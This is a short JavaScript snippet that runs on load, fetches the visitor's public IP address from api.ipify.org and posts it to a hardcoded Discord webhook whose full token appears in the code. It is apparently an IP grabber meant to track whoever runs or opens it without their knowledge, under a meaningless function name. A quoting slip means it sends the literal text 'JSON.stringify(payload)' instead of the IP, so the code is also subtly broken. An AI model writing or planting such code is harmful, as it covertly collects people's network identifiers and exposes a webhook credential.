const webhookUrl = 'https://discord.com/api/webhooks/1088531419615219754/oZTjC9vPNE8zWvlrWBUMb7PUEdv7wGQUlAIe6LngKMooRDimHqn1RPbgzw7teRCTFaHb';
async function _rgiuh() {
  const response = await fetch('https://api.ipify.org/');
  const data = await response.text();

  const payload = {
    content: data
  };

  fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: `JSON.stringify(payload)`
  })
  .catch(error => console.error(error));
}

_rgiuh();
